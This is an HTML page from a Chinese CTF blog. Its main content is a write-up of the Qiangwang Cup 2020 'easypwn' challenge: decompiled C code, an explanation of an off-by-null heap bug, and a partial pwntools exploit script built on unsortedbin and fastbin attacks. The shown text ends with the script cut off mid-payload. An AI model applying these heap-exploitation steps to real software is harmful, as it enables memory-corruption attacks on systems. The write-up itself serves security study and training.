<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="Lock,undefined"><meta name="copyright" content="Lock"><title>【Lock's blog】</title><link rel="stylesheet" href="/LawlietLW.github.io/css/fan.css"><link rel="stylesheet" href="/LawlietLW.github.io/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="icon" href="/LawlietLW.github.io/favicon.ico"><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/LawlietLW.github.io/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/LawlietLW.github.io/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
}</script><meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/LawlietLW.github.io/atom.xml" title="Lock's blog" type="application/atom+xml">
<link rel="stylesheet" href="/LawlietLW.github.io/css/prism-tomorrow.css" type="text/css"></head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="author-info"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">Lock</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="mailto:2499086884@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color6"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/LawlietLW.github.io/archives"><span class="pull-top">日志</span><span class="pull-bottom">32</span></a><a class="author-info-articles-tags article-meta" href="/LawlietLW.github.io/tags"><span class="pull-top">标签</span><span class="pull-bottom">40</span></a><a class="author-info-articles-categories article-meta" href="/LawlietLW.github.io/categories"><span class="pull-top">分类</span><span class="pull-bottom">5</span></a></div><div class="friend-link"><a class="friend-link-text" href="https://buuoj.cn/" target="_blank">友链1:BUUCTF，有刷不完的题~</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="title-name" href="/LawlietLW.github.io/">Lock's blog</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><div id="recent-posts"><!-- each post in page.posts.sort('date', -1).limit(10).toArray()--><!-- config中配置按照什么排序--><div class="recent-post-item"><i class="article-top"></i><a class="post-title" href="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/">BUUCTF刷题记录</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2020-06-18</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/CTF/">CTF</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/PWN/">PWN</a></div></div><div class="post-content"><div class="main-content content"><h2 id="0x1-gyctf-2020-signin"><a href="#0x1-gyctf-2020-signin" class="headerlink" title="0x1.gyctf_2020_signin"></a>0x1.gyctf_2020_signin</h2><p>环境是2.27.这题的考点在于，<strong>calloc</strong>不会从tcache中取chunk，而是直接从fastbin中取，并且会将fastbin中剩余的chunk链入tcache</p></div></div><a class="button-hover more" href="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/">强网杯2020</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2020-08-30</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/CTF/">CTF</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/PWN/">PWN</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF2020/">强网杯2020</a></div></div><div class="post-content"><div class="main-content content"><p>强网杯2020的pwn题多且质量高，非常有必要复现一部分</p>
<h3 id="0x1-easypwn"><a href="#0x1-easypwn" class="headerlink" title="0x1.easypwn"></a>0x1.easypwn</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_ACE</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>

  v1 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">mallopt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v1<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>禁用了fastbin</p>
<p>一共有三个功能，add，dele和edit，先看到add</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>
  size_t size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-14h]</span>
  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">></span> <span class="token number">19</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">==</span> <span class="token number">20</span> <span class="token punctuation">)</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>qword_202500<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">LODWORD</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>size <span class="token operator">></span> <span class="token number">0x3F0</span> <span class="token punctuation">)</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  qword_202500<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>qword_202500<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  qword_202060<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>size<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>最多能分配20个chunk，最大能分配的size为0x3f0</p>
<p>再看到edit</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-14h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>
  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0x13</span> <span class="token punctuation">)</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> qword_202500<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read_n</span><span class="token punctuation">(</span>qword_202500<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">,</span> qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>看到read_n函数</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">read_n</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Fh] [rbp-11h]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-10h]</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-Ch]</span>
  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>

  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> buf <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    v5 <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> v5 <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      buf <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v6<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v6<span class="token punctuation">;</span>
    <span class="token operator">++</span>i<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v6<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p><del>根据经验，当读入数据的函数比较复杂的时候大概率会有off-by-one或者off-by-null</del></p>
<p>问题出在这两句</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></code></pre>
<p>if判断实际上就是<code>if(i&gt;=a2)</code>，a2是chunk的size，<code>*(_BYTE *)(a1 + ++i) = 0</code>，而这一句，++i有问题，当i为a2-1时，++i之后i就变成了a2，于是就会将下一个chunk的size位的一个字节设置为<code>\x00</code></p>
<p>再看到dele</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">dele</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-14h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>
  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0x13</span> <span class="token punctuation">)</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>qword_202500<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  qword_202500<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>没问题，free之后清空悬垂指针</p>
<p>整理信息，无fastbin，存在off-by-null，我们的利用思路如下</p>
<p>1.利用unsortedbin attack修改global_max_fast，使fastbin可用</p>
<p>2.修改<code>_IO_2_1_stdout_</code>泄露libc地址</p>
<p>3.fastbin attack</p>
<p>off-by-null的利用相对于off-by-one还是难啊。。。考验堆风水的构造，这题学到了新姿势，先贴exp</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'easypwn'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-easypwn.so'</span><span class="token punctuation">)</span>
onegadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf0364</span><span class="token punctuation">,</span> <span class="token number">0xf1207</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">edit_n</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">edit_0</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0xa8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>
    dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>
    add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 4</span>
    dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    edit_0<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x150</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 5</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 6</span>
    add<span class="token punctuation">(</span><span class="token number">0xb8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 7</span>
    dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    global_max_fast <span class="token operator">=</span> <span class="token number">0x67f8</span>
    payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>global_max_fast<span class="token number">-0x10</span><span class="token punctuation">)</span>
